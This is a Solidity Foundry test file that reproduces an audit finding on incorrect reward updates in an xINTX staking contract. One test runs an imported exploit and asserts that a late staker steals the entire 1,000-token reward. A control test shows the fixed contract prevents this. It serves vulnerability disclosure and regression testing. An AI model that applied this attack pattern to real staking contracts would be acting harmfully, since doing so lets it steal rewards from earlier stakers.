// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, MiniERC20, StakedINTXFixed, VictimStaker} from "./59428-incorrect-reward-updates-upon-xintx-minting-quantstamp-inten.sol";

contract Finding59428Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_new_stake_takes_1000() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.stolen(), 1_000 ether, "later minter took the whole reward");
        assertEq(e.rewardToken().balanceOf(ATTACKER), 1_000 ether, "attacker balance");
        assertEq(e.attackerId(), 2, "minted the second xINTX");
    }

    function test_control_new_stake_gets_nothing() public {
        MiniERC20 stake = new MiniERC20("INTX", "INTX");
        MiniERC20 reward = new MiniERC20("rINTX", "rINTX");
        StakedINTXFixed s = new StakedINTXFixed(stake, reward);
        VictimStaker victim = new VictimStaker();
        stake.mint(address(victim), 100 ether);
        uint256 victimId = victim.approveAndStakeFixed(stake, s, 100 ether);
        reward.mint(address(this), 1_000 ether);
        reward.approve(address(s), 1_000 ether);
        s.notifyReward(1_000 ether);
        stake.mint(address(this), 100 ether);
        stake.approve(address(s), 100 ether);
        uint256 attackerId = s.stake(100 ether);
        s.claim(attackerId);
        assertEq(reward.balanceOf(address(this)), 0, "no unearned reward");
        s.claim(victimId);
        assertEq(reward.balanceOf(address(victim)), 1_000 ether, "early staker keeps the reward");
    }
}
